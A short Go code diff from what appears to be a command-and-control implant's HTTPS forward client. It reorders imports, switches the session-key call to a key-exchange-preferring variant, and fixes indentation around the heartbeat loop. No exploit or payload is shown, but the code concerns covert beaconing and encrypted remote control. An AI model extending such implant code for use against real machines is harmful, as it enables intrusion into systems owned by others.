@@ -3,18 +3,18 @@
 package main
 
 import (
-	"sync"
-	"implant/core/app"
-	"implant/core/debuglog"
-	"implant/core/communication"
-	"implant/core/encrypt"
-	"implant/core/reconnect"
-	"implant/core/utils"
 	"bufio"
 	"crypto/tls"
 	"fmt"
+	"implant/core/app"
+	"implant/core/communication"
+	"implant/core/debuglog"
+	"implant/core/encrypt"
+	"implant/core/reconnect"
+	"implant/core/utils"
 	"net"
 	"net/http"
+	"sync"
 	"time"
 )
 
@@ -226,7 +226,7 @@ func (c *HTTPSForwardClient) handleConn(w http.ResponseWriter, r *http.Request) 
 
 	// 会话密钥（https_forward 用占位符 key，与服务端 https_forward 分支一致）
 	salt, masterKey := app.GetListenerKeyConfig("https_forward")
-	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
+	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
 		select {
 		case c.connectedCh <- err:
 		default:
@@ -242,7 +242,7 @@ func (c *HTTPSForwardClient) handleConn(w http.ResponseWriter, r *http.Request) 
 		close(c.stopCh)
 	}
 	c.stopCh = make(chan struct{})
-stop := c.stopCh
+	stop := c.stopCh
 	go app.HeartbeatLoop(stop, c.keepAlive)
 
 	select {
@@ -310,7 +310,7 @@ func (c *HTTPSForwardClient) rawSend(msg []byte) error {
 }
 
 func (c *HTTPSForwardClient) keepAlive() {
-		c.rawSend(communication.HeartbeatMsg())
+	c.rawSend(communication.HeartbeatMsg())
 }
 
 func (c *HTTPSForwardClient) Close() error {
